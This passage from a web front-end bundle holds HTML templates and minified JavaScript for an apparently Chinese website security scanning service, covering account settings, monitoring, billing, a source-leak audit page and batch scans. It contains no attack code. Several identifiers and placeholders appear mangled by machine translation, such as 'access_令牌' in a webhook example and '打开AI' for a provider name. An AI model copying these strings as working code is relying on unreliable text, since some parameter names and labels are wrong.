        <div class="auth-form-error" id="register-error"></div>

        <div class="auth-form-row">

          <input type="text" id="reg-username" placeholder="用户名" aria-label="用户名" />

        </div>

        <div class="auth-form-row">

          <input type="text" id="reg-email" placeholder="邮箱（可选）" aria-label="邮箱" />

        </div>

        <div class="auth-form-row">

          <input type="password" id="reg-password" placeholder="密码" aria-label="密码" />

        </div>

        <div class="auth-form-row">

          <input type="password" id="reg-password2" placeholder="确认密码" aria-label="确认密码" />

        </div>

        <div class="auth-form-row">

          <div id="auth-challenge-question-reg" class="auth-form-hint" style="margin-bottom:8px">验证码加载中...</div>
          <input type="hidden" id="auth-challenge-token-reg" />
          <input type="text" id="reg-challenge-answer" placeholder="验证码答案（30秒有效）" aria-label="验证码答案（30秒有效）" />

        </div>

        <div class="auth-form-row">

          <button class="auth-form-btn secondary" style="flex:1" onclick="refreshAuthChallenge()">刷新验证码</button>

        </div>

        <div class="auth-form-row">

          <button class="auth-form-btn secondary" style="flex:1" onclick="doResendVerification()">重新发送验证邮件</button>

        </div>

        <div class="auth-form-row">

          <button class="auth-form-btn" style="flex:1" onclick="doRegister()">注 册</button>

        </div>

        <div class="auth-form-row">

          <input type="text" id="verify-email-token" placeholder="邮箱验证令牌（收到邮件后填写）" aria-label="邮箱验证 令牌" />

        </div>

        <div class="auth-form-row">

          <button class="auth-form-btn secondary" style="flex:1" onclick="doVerifyEmailFromToken()">验证邮箱</button>

        </div>

        <div class="auth-form-switch">

          已有账号？<a onclick="toggleAuthForm('login')">去登录</a>

        </div>

      </div>

    </div>



    <!-- 已登录：显示用户信息 -->

    <div id="auth-logged" style="display:none">

      <div class="settings-user-row">

        <div>

          <div class="user-name" id="auth-display-name">用户</div>

          <div class="user-label" id="auth-user-role">已登录</div>

          <div class="user-credits" id="user-credits" style="font-size:12px;color:var(--warning);margin-top:4px">额度：--</div>

        </div>

        <button class="auth-logout-btn" onclick="doLogout()">退出登录</button>

      </div>

    </div>

  </div>



  <!-- 账号统计 -->

  <div class="settings-group">

    <div class="settings-row-static">

      <div style="text-align:center;flex:1">

        <div class="num" id="stat-scan-count" style="color:var(--primary);font-size:18px;font-weight:700">0</div>

        <div style="font-size:11px;color:var(--text-secondary);margin-top:2px">扫描次数</div>

      </div>

      <div style="text-align:center;flex:1;border-left:1px solid var(--border-light);border-right:1px solid var(--border-light)">

        <div class="num" id="stat-avg-score" style="color:var(--success);font-size:18px;font-weight:700">-</div>

        <div style="font-size:11px;color:var(--text-secondary);margin-top:2px">平均评分</div>

      </div>

      <div style="text-align:center;flex:1">

        <div class="num" id="stat-fixed-count" style="color:var(--warning);font-size:18px;font-weight:700">0</div>

        <div style="font-size:11px;color:var(--text-secondary);margin-top:2px">已修复</div>

      </div>

    </div>

  </div>



  <!-- 设置菜单 -->

  <div class="settings-group">

    <div class="settings-row" onclick="showProfileTab('history')">

      <span>扫描历史</span>

      <span class="settings-arrow">&#x203A;</span>

    </div>

    <div class="settings-row" onclick="showProfileTab('knowledge')">

      <span>安全知识库</span>

      <span class="settings-arrow">&#x203A;</span>

    </div>

    <div class="settings-row" onclick="showProfileTab('monitor')">

      <span>监控目标</span>

      <span class="settings-arrow">&#x203A;</span>

    </div>

    <div class="settings-row" onclick="showProfileTab('alerts')">

      <span>告警历史</span>

      <span class="settings-arrow">&#x203A;</span>

    </div>

    <div class="settings-row" onclick="showProfileTab('credits')">

      <span>额度与使用记录</span>

      <span class="settings-arrow">&#x203A;</span>

    </div>

    <div class="settings-row" onclick="navigateTo('assets')">

      <span>资产管理</span>

      <span class="settings-arrow">&#x203A;</span>

    </div>

    <div class="settings-row" onclick="navigateTo('billing')">

      <span>购买积分套餐</span>

      <span class="settings-arrow">&#x203A;</span>

    </div>

    <div class="settings-row" onclick="showProfileTab('settings')">

      <span>扫描设置</span>

      <span class="settings-arrow">&#x203A;</span>

    </div>

    <div class="settings-row" onclick="showProfileTab('notifications')">

      <span>通知设置</span>

      <span class="settings-arrow">&#x203A;</span>

    </div>
    <div class="settings-row" id="admin-logs-menu" style="display:none" onclick="showProfileTab('admin-logs')">
      <span>管理员日志</span>
      <span class="settings-arrow">&#x203A;</span>
    </div>

    <div class="settings-row" onclick="showProfileTab('ai-config')">

      <span>安全顾问配置</span>

      <span class="settings-arrow">&#x203A;</span>

    </div>

  </div>



  <!-- 接口令牌 -->

  <div class="settings-group">

    <div class="settings-group-title">接口令牌</div>

    <div class="settings-row-static">

      <input type="text" id="api-令牌-input" readonly value="登录后显示 令牌" style="flex:1;background:#2b2b2b;color:var(--text-secondary);font-family:monospace;font-size:11px" />

      <button class="fixer-btn secondary" style="height:32px;padding:0 12px;font-size:12px" onclick="copyApiToken()">复制</button>

    </div>

    <p style="font-size:11px;color:var(--text-secondary);margin-top:6px">此 令牌 用于 API 调用身份认证，登录后自动生成。令牌 会在服务端密钥变更或过期后失效。</p>

  </div>



  <!-- 扫描历史面板 -->

  <div id="profile-tab-history" class="profile-tab" style="display:none">

    <div class="card">

      <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:12px">

        <div class="card-title">扫描历史</div>

        <button class="fixer-btn secondary" style="height:36px;padding:0 14px;font-size:12px" onclick="clearScanHistory()">清空历史</button>

      </div>

      <!-- 风险趋势 -->

      <div id="history-trend-wrap" style="margin-bottom:16px;display:none">

        <div style="font-size:13px;font-weight:600;margin-bottom:8px">最近 5 次风险趋势</div>

        <div id="history-trend-chart" style="height:60px"></div>

      </div>

      <!-- 对比模式工具栏 -->

      <div id="history-compare-bar" style="display:none;align-items:center;gap:8px;margin-bottom:12px;padding:10px;background:var(--bg);border-radius:2px;border:1px solid var(--border)">

        <span style="font-size:12px;color:var(--text-secondary)">已选择 <strong id="history-compare-count">0</strong> 项</span>

        <button class="fixer-btn secondary" style="height:32px;padding:0 12px;font-size:12px;margin-left:auto" onclick="cancelHistoryCompare()">取消</button>

        <button class="fixer-btn primary" style="height:32px;padding:0 12px;font-size:12px" id="history-compare-btn" onclick="doHistoryCompare()" disabled>对比</button>

      </div>

      <div id="scan-history-list"></div>

      <div id="history-pagination" class="pagination-bar" style="display:none"></div>

    </div>

  </div>



  <!-- 安全知识库面板 -->

  <div id="profile-tab-knowledge" class="profile-tab" style="display:none">

    <div class="card">

      <div class="card-title">安全响应头速查</div>

      <div class="finding-section" style="margin-top:10px">

        <h4>Strict-Transport-Security (HSTS)</h4>

        <p>强制浏览器使用 HTTPS，防止 SSL 剥离攻击。</p>

        <div class="code-block" style="margin-top:6px">add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;</div>

      </div>

      <div class="finding-section">

        <h4>Content-Security-Policy (CSP)</h4>

        <p>限制页面可加载的资源来源，防止 XSS 攻击。</p>

        <div class="code-block" style="margin-top:6px">add_header Content-Security-Policy "default-src 'self'; script-src 'self'; frame-ancestors 'none'" always;</div>

      </div>

      <div class="finding-section">

        <h4>X-Frame-Options</h4>

        <p>防止网站被嵌入到恶意 iframe 中（点击劫持）。</p>

        <div class="code-block" style="margin-top:6px">add_header X-Frame-Options "DENY" always;</div>

      </div>

      <div class="finding-section">

        <h4>X-Content-Type-Options</h4>

        <p>禁止浏览器进行 MIME 类型嗅探。</p>

        <div class="code-block" style="margin-top:6px">add_header X-Content-Type-Options "nosniff" always;</div>

      </div>

    </div>

  </div>



  <!-- 监控目标面板 -->

  <div id="profile-tab-monitor" class="profile-tab" style="display:none">

    <div class="card">

      <div class="card-title">监控目标管理</div>

      <p class="card-desc" style="margin-bottom:14px">添加需要定期扫描的网站 URL，系统将按设定频率自动扫描。</p>

      <div class="monitor-add-row">

        <input type="url" id="monitor-url-input" placeholder="输入网址，例如 https://示例.com" />

        <select id="monitor-freq-select">

          <option value="daily">每天</option>

          <option value="weekly">每周</option>

          <option value="none">不扫描</option>

        </select>

        <button class="monitor-add-btn" onclick="addMonitorTarget()"> 添加</button>

      </div>

      <div id="monitor-target-list"></div>

    </div>

  </div>



  <!-- 告警历史面板 -->

  <div id="profile-tab-alerts" class="profile-tab" style="display:none">

    <div class="card">

      <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:12px">

        <div class="card-title">告警历史</div>

        <button class="fixer-btn secondary" style="height:36px;padding:0 14px;font-size:12px" onclick="markAllAlertsRead()">全部已读</button>

      </div>

      <div id="alerts-list" style="min-height:60px"></div>

      <div id="alerts-pagination" class="pagination-bar" style="display:none"></div>

    </div>

  </div>



  <!-- 设置面板 -->

  <div id="profile-tab-settings" class="profile-tab" style="display:none">

    <div class="card">

      <div class="card-title">扫描设置</div>

      <div class="settings-row" style="margin-top:10px" onclick="toggleSetting(this, 'auto保存')">

        <span>自动保存扫描结果</span>

        <span class="settings-toggle on" id="setting-auto保存" data-enabled="true"></span>

      </div>

      <div class="settings-row" onclick="toggleSetting(this, 'darkMode')">

        <span>深色模式</span>

        <span class="settings-toggle" id="setting-darkMode" data-enabled="false"></span>

      </div>

      <div class="settings-row" onclick="toggleSetting(this, 'notify')">

        <span>扫描完成提醒</span>

        <span class="settings-toggle on" id="setting-notify" data-enabled="true"></span>

      </div>

    </div>

  </div>



  <!-- 通知设置面板 -->

  <div id="profile-tab-notifications" class="profile-tab" style="display:none">

    <div class="card">

      <div class="card-title">通知设置</div>

      <p class="card-desc" style="margin-bottom:14px">配置告警通知方式，支持邮件和 Webhook（钉钉/企业微信/飞书）。</p>

      <div style="margin-bottom:12px">

        <label style="font-size:13px;font-weight:600;display:block;margin-bottom:6px">通知邮箱</label>

        <input type="email" id="notify-email-input" placeholder="name@example.com" style="width:100%;padding:10px;border:1px solid var(--border);border-radius:2px;font-size:13px;background:var(--bg);color:var(--text)" />

      </div>

      <div style="margin-bottom:12px">

        <label style="font-size:13px;font-weight:600;display:block;margin-bottom:6px">Webhook 地址</label>

        <input type="url" id="notify-webhook-input" placeholder="https://oapi.dingtalk.com/robot/send?access_令牌=你的令牌" style="width:100%;padding:10px;border:1px solid var(--border);border-radius:2px;font-size:13px;background:var(--bg);color:var(--text)" />

        <p style="font-size:12px;color:var(--text-secondary);margin-top:4px">支持钉钉、企业微信、飞书等 Markdown Webhook</p>

      </div>

      <div style="margin-bottom:16px">

        <label style="font-size:13px;font-weight:600;display:block;margin-bottom:6px">告警阈值</label>

        <select id="notify-threshold-select" style="width:100%;padding:10px;border:1px solid var(--border);border-radius:2px;font-size:13px;background:var(--bg);color:var(--text)">

          <option value="critical">仅严重 (Critical)</option>

          <option value="high">高危及以上 (High+)</option>

          <option value="medium">中危及以上 (Medium+)</option>

          <option value="low">低危及以上 (Low+)</option>

          <option value="all">全部通知</option>

        </select>

      </div>

      <button class="fixer-btn primary" style="width:100%" onclick="saveNotificationSettings()">保存设置</button>

    </div>

  </div>



  <!-- 额度与使用记录面板 -->

  <div id="profile-tab-credits" class="profile-tab" style="display:none">

    <div class="card">

      <div class="card-title">额度与使用记录</div>

      <div style="display:flex;align-items:center;gap:12px;margin:14px 0;padding:14px;background:var(--bg);border:1px solid var(--border);border-radius:2px">

        <div>

          <div style="font-size:12px;color:var(--text-secondary)">当前额度</div>

          <div id="credits-balance" style="font-size:24px;font-weight:700;color:var(--warning)">--</div>

        </div>

        <button class="fixer-btn secondary" style="margin-left:auto;height:32px;padding:0 14px;font-size:12px" onclick="loadCreditsUsage()">刷新</button>

      </div>

      <div id="credits-usage-list" style="min-height:60px">

        <div style="text-align:center;padding:20px;color:var(--text-secondary)">正在读取使用记录...</div>

      </div>

      <div id="credits-pagination" class="pagination-bar" style="display:none"></div>

    </div>

  </div>



  <!-- 安全顾问配置面板 -->

  <div id="profile-tab-admin-logs" class="profile-tab" style="display:none">
    <div class="card">
      <div class="card-title">管理员日志</div>
      <p class="card-desc">查看账号操作记录与邮件投递状态。邮箱地址已脱敏，邮件正文和验证令牌不会保存。</p>
      <div style="margin-top:16px;font-size:13px;font-weight:600">操作审计日志</div>
      <div id="admin-audit-logs" style="margin-top:10px"></div>
      <div style="margin-top:20px;font-size:13px;font-weight:600">邮件投递日志</div>
      <div id="admin-email-logs" style="margin-top:10px"></div>
    </div>
  </div>

  <div id="profile-tab-ai-config" class="profile-tab" style="display:none">

    <div class="card">

      <div class="card-title">安全顾问配置</div>

      <div style="margin-top:14px">

        <label style="display:block;font-size:13px;color:var(--text-secondary);margin-bottom:6px">接口密钥</label>

        <div style="display:flex;gap:8px">

          <input id="ai-config-apikey" type="password" placeholder="sk-你的密钥" style="flex:1;padding:10px 12px;border:1px solid var(--border);border-radius:2px;font-size:13px;background:var(--bg);color:var(--text)" />

          <button onclick="toggleApiKeyVisibility()" id="ai-config-eye" style="background:var(--bg-secondary);border:1px solid var(--border);border-radius:2px;padding:0 12px;cursor:pointer;font-size:13px;color:var(--text-secondary)">显示</button>

        </div>

        <div style="font-size:11px;color:var(--text-lighter);margin-top:4px">接口密钥 仅保存在浏览器本地，不会上传到服务器。</div>

      </div>

      <div style="margin-top:14px">

        <label style="display:block;font-size:13px;color:var(--text-secondary);margin-bottom:6px">模型提供商</label>

        <select id="ai-config-provider" style="width:100%;padding:10px 12px;border:1px solid var(--border);border-radius:2px;font-size:13px;background:var(--bg);color:var(--text)">

          <option value="openai">打开AI (GPT-4)</option>

        </select>

      </div>

      <div style="margin-top:14px">

        <label style="display:block;font-size:13px;color:var(--text-secondary);margin-bottom:6px">模型名称</label>

        <input id="ai-config-model" type="text" placeholder="例如：gpt-4o-mini" style="width:100%;padding:10px 12px;border:1px solid var(--border);border-radius:2px;font-size:13px;background:var(--bg);color:var(--text)" />

      </div>

      <div class="settings-row" style="margin-top:14px" onclick="toggleAISetting('useLLM')">

        <span>启用 LLM（优先调用真实大模型）</span>

        <span class="settings-toggle on" id="setting-useLLM" data-enabled="true"></span>

      </div>

      <div style="margin-top:14px;display:flex;gap:8px">

        <button onclick="saveAIConfig()" style="flex:1;background:var(--primary);color:#fff;border:1px solid var(--primary-dark);padding:10px;border-radius:2px;cursor:pointer;font-size:13px;font-weight:500">保存配置</button>

        <button onclick="clearAIConfig()" style="flex:1;background:var(--bg);color:var(--text);border:1px solid var(--border);padding:10px;border-radius:2px;cursor:pointer;font-size:13px">清除配置</button>

      </div>

    </div>

  </div>



</div>



<!-- 计费套餐页面 -->

<div class="page" id="page-billing">

  <div class="workbench-header">

    <h1 class="workbench-title">服务套餐</h1>

    <span class="workbench-subtitle">购买积分套餐，按量使用扫描与修复服务</span>

  </div>



  <div class="card" style="margin-bottom:16px">

    <div class="card-title">选择套餐</div>

    <p class="card-desc" style="margin-bottom:14px">额度用于体检、复测、修复验证、报告导出和审计留痕，购买后即时到账。</p>

    <div id="billing-plans-list" style="min-height:80px">

      <div style="text-align:center;padding:20px;color:var(--text-secondary)">正在加载服务套餐...</div>

    </div>

  </div>



  <div class="card">

    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:12px">

      <div class="card-title">服务记录</div>

      <button class="fixer-btn secondary" style="height:32px;padding:0 14px;font-size:12px" onclick="loadBillingPage()">刷新</button>

    </div>

    <div id="billing-records-list" style="min-height:60px">

      <div style="text-align:center;padding:20px;color:var(--text-secondary)">正在读取充值记录...</div>

    </div>

    <div id="billing-records-pagination" class="pagination-bar" style="display:none"></div>

  </div>

</div>



<div class="page" id="page-audit">

  <div class="workbench-header">

    <h1 class="workbench-title">源码与上线审计</h1>

    <span class="workbench-subtitle">用于检查网站是否存在源码泄露、源码映射暴露、目录索引、敏感文件与上线前基础风险</span>

  </div>



  <div class="card" style="margin-bottom:16px">

    <div class="card-title">审计说明</div>

    <p class="card-desc" style="margin-bottom:14px">这里不是本地仓库的静态代码审计，而是针对目标网站的源码泄露与上线前安全审计。输入网址后，系统会复用现有扫描能力，重点筛查 source map、目录索引、敏感文件、HTML 注释、调试信息、配置暴露与高风险外链，并输出可交付的审计结论。</p>

    <div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(220px,1fr));gap:12px">

      <div style="padding:12px 14px;border:1px solid var(--border);border-radius:2px;background:var(--bg)"><strong>1. 源码泄露</strong><div style="font-size:12px;color:var(--text-secondary);margin-top:4px">检查 .map、source map、HTML 注释、目录索引、调试输出等风险。</div></div>

      <div style="padding:12px 14px;border:1px solid var(--border);border-radius:2px;background:var(--bg)"><strong>2. 上线检查</strong><div style="font-size:12px;color:var(--text-secondary);margin-top:4px">检查常见安全响应头、敏感路径、登录态与重定向风险。</div></div>

      <div style="padding:12px 14px;border:1px solid var(--border);border-radius:2px;background:var(--bg)"><strong>3. 结果输出</strong><div style="font-size:12px;color:var(--text-secondary);margin-top:4px">输出命中项、证据片段、置信度与可直接交付的结论。</div></div>

      <div style="padding:12px 14px;border:1px solid var(--border);border-radius:2px;background:var(--bg)"><strong>4. 复测建议</strong><div style="font-size:12px;color:var(--text-secondary);margin-top:4px">给出修复方向、复测建议与二次核验重点。</div></div>

    </div>

  </div>



  <div class="card" style="margin-bottom:16px">

    <div class="card-title">执行审计</div>

    <div style="display:grid;gap:12px;margin-top:12px">

      <div>

        <label for="audit-url" style="display:block;margin-bottom:6px;font-size:13px;font-weight:600">目标网址</label>

        <input id="audit-url" type="url" placeholder="输入网站地址，例如 https://example.com" style="width:100%;padding:12px 14px;border:1px solid var(--border);border-radius:2px;font-size:14px;background:var(--bg);color:var(--text)" />

      </div>

      <label class="scan-checkbox" style="margin:0">

        <input id="audit-auth-check" type="checkbox" onchange="document.getElementById('audit-run-btn').disabled=!this.checked" />

        <span>我已确认目标属于授权范围，不涉及受限目标</span>

      </label>

      <div style="display:flex;flex-wrap:wrap;gap:10px;align-items:center">

        <button id="audit-run-btn" class="btn btn-primary" onclick="runAuditWorkbench()" disabled>开始审计</button>

        <button class="btn btn-secondary" onclick="fillAuditTargetFromScan()">使用当前扫描网址</button>

        <button class="btn btn-secondary" onclick="downloadAuditReport()">导出审计 PDF</button>

      </div>

      <div id="audit-status" style="font-size:13px;color:var(--text-secondary)">请输入网址后开始审计。</div>

    </div>

  </div>



  <div class="card">

    <div class="card-title">审计结果</div>

    <div id="audit-result" style="margin-top:12px;min-height:120px">

      <div style="text-align:center;padding:24px 16px;color:var(--text-secondary)">审计结果会显示在这里。</div>

    </div>

  </div>

</div>



<!-- Batch Scan Modal -->

<div class="modal" id="batch-scan-modal" style="display:none;position:fixed;inset:0;background:rgba(0,0,0,0.5);z-index:1000;align-items:center;justify-content:center">

  <div class="modal-content" style="background:var(--card);border:1px solid var(--border);border-radius:2px;padding:20px;max-width:520px;width:92vw;max-height:85vh;overflow-y:auto">

    <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:14px">

      <h3 style="margin:0;font-size:16px">批量体检</h3>

      <button onclick="closeBatchScanModal()" aria-label="关闭批量体检" style="background:none;border:none;font-size:20px;cursor:pointer;color:var(--text-secondary)">×</button>

    </div>

    <div style="font-size:12px;color:var(--text-secondary);margin-bottom:8px">每行一个 URL，最多 5 个。建议先用快速模式体检公开测试站点：</div>

    <textarea id="batch-urls" placeholder="https://示例.com&#10;https://测试站点.com&#10;https://样例.org" style="width:100%;min-height:120px;padding:10px;border:1px solid var(--border);border-radius:2px;font-family:monospace;font-size:12px;background:var(--bg);color:var(--text);resize:vertical"></textarea>

    <div style="margin:10px 0;display:flex;align-items:center;gap:6px;font-size:12px">

      <input type="checkbox" id="batch-deep" style="cursor:pointer" />

      <label for="batch-deep" style="cursor:pointer;color:var(--text-secondary)">深度扫描（含 XSS/SQLi 注入测试）</label>

    </div>

    <label class="scan-checkbox" style="margin-bottom:10px">

      <input id="batch-auth-check" type="checkbox" onchange="document.getElementById('batch-go-btn').disabled=!this.checked" />

      <span>我已确认目标属于授权范围，不涉及受限目标</span>

    </label>

    <div id="batch-results" style="margin-top:12px"></div>

    <div style="display:flex;gap:8px;margin-top:14px">

      <button onclick="closeBatchScanModal()" style="flex:1;background:var(--bg);color:var(--text);border:1px solid var(--border);padding:10px;border-radius:2px;cursor:pointer">关闭</button>

      <button onclick="doBatchScan()" id="batch-go-btn" disabled style="flex:1;background:var(--primary);color:#fff;border:1px solid var(--primary-dark);padding:10px;border-radius:2px;cursor:pointer;font-weight:500">开始批量体检</button>

    </div>

  </div>

</div>



<nav class="bottom-nav">

  <button class="nav-item active" data-page="home" onclick="navigateTo('home')">

    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"/><polyline points="9 22 9 12 15 12 15 22"/></svg>

    <span>首页</span>

  </button>

  <button class="nav-item" data-page="scan" onclick="navigateTo('scan')">

    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="11" cy="11" r="8"/><line x1="21" y1="21" x2="16.65" y2="16.65"/></svg>

    <span>扫描</span>

  </button>

  <button class="nav-item" data-page="fixer" onclick="navigateTo('fixer')">

    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14.7 6.3a1 1 0 0 0 0 1.4l1.6 1.6a1 1 0 0 0 1.4 0l3.77-3.77a6 6 0 0 1-7.94 7.94l-6.91 6.91a2.12 2.12 0 0 1-3-3l6.91-6.91a6 6 0 0 1 7.94-7.94l-3.76 3.76z"/></svg>

    <span>修复器</span>

  </button>

  <button class="nav-item" data-page="tickets" onclick="navigateTo('tickets')">

    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 11l3 3L22 4"/><path d="M21 12v7a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h11"/></svg>

    <span>工单</span>

  </button>

  <button class="nav-item" data-page="billing" onclick="navigateTo('billing')">

    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="5" width="20" height="14" rx="2"/><line x1="2" y1="10" x2="22" y2="10"/></svg>

    <span>计费</span>

  </button>

  <button class="nav-item" data-page="audit" onclick="navigateTo('audit')">

    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 2l7 4v6c0 5-3.8 9.7-7 10-3.2-.3-7-5-7-10V6l7-4z"/><path d="M9 12l2 2 4-4"/></svg>

    <span>审计</span>

  </button>

  <button class="nav-item" data-page="profile" onclick="navigateTo('profile')">

    <div style="position:relative">

      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>

      <span id="nav-alert-badge" style="display:none;position:absolute;top:-4px;right:-6px;background:var(--danger);color:#fff;font-size:10px;font-weight:700;padding:1px 5px;border-radius:2px;min-width:16px;text-align:center">0</span>

    </div>

    <span>我的</span>

  </button>

</nav>



<!-- 右上角主题切换按钮 -->

<button class="theme-fab" id="theme-fab" onclick="toggleThemeQuick()" aria-label="切换明暗主题" title="切换主题">

  <svg id="theme-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="width:20px;height:20px">

    <circle cx="12" cy="12" r="5"/><path d="M12 1v2M12 21v2M4.22 4.22l1.42 1.42M18.36 18.36l1.42 1.42M1 12h2M21 12h2M4.22 19.78l1.42-1.42M18.36 5.64l1.42-1.42"/>

  </svg>

</button>

`;function tt(e){return document.getElementById(e)||null}function at(e,i){let t=tt(e);t&&(t.textContent=i)}function Zi(e,i){let t=tt(e);t&&(t.innerHTML=i)}function $e(e,i){let t=tt(e);t&&(t.style.display=i)}function S(e){if(e==null)return"";let i=document.createElement("div");return i.appendChild(document.createTextNode(String(e))),i.innerHTML}function xe(e){return String(e??"").replace(/'/g,"&#39;").replace(/"/g,"&quot;")}function it(e){try{return/^https?:\/\//i.test(e)||(e="http://"+e),new URL(e).hostname}catch{return e.replace(/^https?:\/\//i,"").split("/")[0]}}function Nt(e){return e=parseInt(e,10),isNaN(e)&&(e=0),e>=75?"#73c990":e>=50?"#f0a732":"#c75450"}function jt(e){return e=parseInt(e,10),isNaN(e)&&(e=0),e=Math.max(0,Math.min(100,e)),e>=75?"conic-gradient(#73c990 0% "+e+"%, #334155 "+e+"% 100%)":e>=50?"conic-gradient(#f0a732 0% "+e+"%, #334155 "+e+"% 100%)":"conic-gradient(#c75450 0% "+e+"%, #334155 "+e+"% 100%)"}function Xi(e){return e==="严重"||e==="critical"||e==="高风险"||e==="high"?"high":e==="中风险"||e==="medium"?"medium":"low"}function wt(e){return navigator.clipboard&&navigator.clipboard.writeText?navigator.clipboard.writeText(e):new Promise((i,t)=>{try{let s=document.createElement("textarea");s.value=e,s.style.position="fixed",s.style.left="-9999px",document.body.appendChild(s),s.select(),document.execCommand("copy"),document.body.removeChild(s),i()}catch(s){t(s)}})}function Gt(e){if(!e)return"-";try{const i=new Date(e);if(isNaN(i.getTime()))return e;const t=s=>String(s).padStart(2,"0");return`${i.getFullYear()}-${t(i.getMonth()+1)}-${t(i.getDate())} ${t(i.getHours())}:${t(i.getMinutes())}`}catch{return e}}function Ue(e){if(!e)return"未知错误";let i="";return typeof e.error=="string"&&e.error?i=e.error:typeof e.detail=="string"&&e.detail?i=e.detail:Array.isArray(e.detail)&&e.detail.length>0?i=e.detail.map(function(t){return t?typeof t=="string"?t:typeof t.msg=="string"&&t.msg?t.msg:Array.isArray(t.loc)&&t.loc.length?String(t.loc[t.loc.length-1]):"":""}).filter(Boolean).join("；"):typeof e.message=="string"&&e.message?i=e.message:i="请求失败",typeof e.code=="string"&&!i.includes(e.code)&&e.code!=="ERROR"&&(i+="（"+e.code+"）"),e.restricted_code==="restricted"?i+="（该目标类型受限，请确认您拥有合法授权后再扫描）":e.restricted_code==="ownership_required"?i+="，请先完成域名归属验证。":e.restricted_code==="unauthorized"&&(i+="（请先确认您有权扫描该目标）"),i}function Jt(e){return e&&e._status===402&&e.code==="PAYMENT_REQUIRED"}function $t(e){return Jt(e)?typeof e.message=="string"&&e.message||"额度不足，请充值后再试":""}function pt(e){let i=e&&(e.message||e.error||e.detail)||String(e)||"未知错误";return/timeout|timed out/i.test(i)?"请求超时，请检查网络连接或稍后重试":/network|fetch|internet|offline|failed to fetch|connect/i.test(i)?"网络连接异常，请确认本地后端已启动，或检查防火墙是否拦截了 127.0.0.1:8011":/403|forbidden/i.test(i)?"请求被拒绝，请检查权限或目标授权状态":/404|not found/i.test(i)?"请求的资源不存在，请确认接口或页面地址是否正确":/500|502|503|504|server error/i.test(i)?"服务器暂时不可用，请稍后重试，或重启本地后端后再试":/unauthorized|401|未登录|登录|token|jwt/i.test(i)?"登录状态已过期，请重新登录":/dns|resolve|name or service not known/i.test(i)?"目标域名无法解析，请检查网址是否正确":/connection refused|econnrefused/i.test(i)?"本地服务未启动或端口被占用，请重新打开安装包或检查 8011 端口":i}function ue(e,i){let t=tt(e);t&&(i?(t._originalText=t.textContent,t.textContent="处理中...",t.disabled=!0):(t.textContent=t._originalText||t.textContent,t.disabled=!1))}function gi(e,i,t,s){let r=tt(e);if(!r)return;if(t<=1){r.innerHTML="";return}let o="",a=5,n=Math.max(1,i-Math.floor(a/2)),d=Math.min(t,n+a-1);d-n<a-1&&(n=Math.max(1,d-a+1)),i>1&&(o+='<button class="page-btn" data-page="'+(i-1)+'">上一页</button>');for(let f=n;f<=d;f++)o+='<button class="page-btn '+(f===i?"active":"")+'" data-page="'+f+'">'+f+"</button>";i<t&&(o+='<button class="page-btn" data-page="'+(i+1)+'">下一页</button>'),r.innerHTML=o,r.querySelectorAll(".page-btn").forEach(function(f){f.addEventListener("click",function(){let v=parseInt(this.dataset.page,10);s&&s(v)})})}var ir={header:"相关响应头",detected:"检测结果",reason:"判断依据",impact:"影响说明",value:"当前值",check_scope:"检测范围",limitation:"检测局限",param:"问题参数",payload:"测试 Payload",url:"问题 URL",path:"暴露路径",status:"响应状态",snippet:"内容片段",library:"组件名称",version:"当前版本",detected_version:"当前版本",min_safe_version:"安全版本",cve:"关联 CVE",missing_flags:"缺失安全标志",redirect_to:"重定向目标",os:"操作系统",body_hint:"响应特征",days_left:"证书剩余天数",method:"检测方法"},nr=["detected","header","reason","impact","value","check_scope","limitation","param","payload","url","path","status","snippet","library","version","detected_version","min_safe_version","cve","missing_flags","redirect_to","os","body_hint","days_left","method"];function ai(e){if(!e||typeof e!="object")return"";let i=Object.keys(e).filter(function(r){return e[r]!==void 0&&e[r]!==null&&e[r]!==""});if(i.length===0)return"";let t=[];return nr.forEach(function(r){i.indexOf(r)>=0&&t.push(r)}),i.forEach(function(r){t.indexOf(r)<0&&t.push(r)}),'<div style="margin-top:10px">'+t.map(function(r){let o=ir[r]||r,a=e[r],n="";if(r==="detected"){let d=a?"#c75450":"#73c990",f=a?"已检测到":"未检测到";n='<span style="color:'+d+';font-weight:600;font-size:12px">'+f+"</span>"}else if(r==="payload")n='<code style="background:#3b0d0d;color:#fecaca;padding:2px 8px;border-radius:2px;font-size:12px;word-break:break-all;border:1px solid rgba(199,84,80,0.35)">'+S(a)+"</code>";else if(r==="url"||r==="path")n='<code style="background:#2b2b2b;padding:2px 8px;border-radius:2px;font-size:12px;word-break:break-all">'+S(a)+"</code>";else if(r==="cve"){let d=String(a),f=d.match(/CVE-\d{4}-\d{4,7}/gi)||[];if(f.length>0){n=f.map(function(c){return'<span style="display:inline-block;background:#c75450;color:#fff;padding:2px 8px;border-radius:2px;font-size:11px;font-weight:700;letter-spacing:0.3px">'+S(c)+"</span>"}).join(" ");let v=d.replace(/CVE-\d{4}-\d{4,7}/gi,"").replace(/[,\s、，；;]+/g," ").trim();v&&(n+=' 